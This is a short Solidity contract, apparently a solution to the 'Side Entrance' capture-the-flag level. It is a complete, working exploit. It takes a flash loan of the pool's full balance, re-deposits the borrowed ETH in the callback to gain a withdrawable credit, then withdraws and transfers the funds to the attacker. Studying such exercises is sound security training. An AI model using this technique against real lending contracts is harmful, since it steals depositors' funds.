pragma solidity ^0.6.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttacker {
    SideEntranceLenderPool private pool;
    address private owner;
    
    constructor(address _pool) public {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }
    
    function attack() external {
        require(msg.sender == owner, "Only owner");
        
        // Get the pool's balance
        uint256 poolBalance = address(pool).balance;
        
        // Take a flash loan for the entire pool balance
        pool.flashLoan(poolBalance);
        
        // Now we have a balance in the pool's mapping, withdraw it
        pool.withdraw();
        
        // Transfer the ETH to the attacker
        msg.sender.transfer(address(this).balance);
    }
    
    // This function is called by the pool during the flash loan
    function execute() external payable {
        // Deposit the borrowed ETH back into the pool
        // This satisfies the flash loan requirement while giving us credit
        pool.deposit{value: msg.value}();
    }
    
    // Receive ETH
    receive() external payable {}
}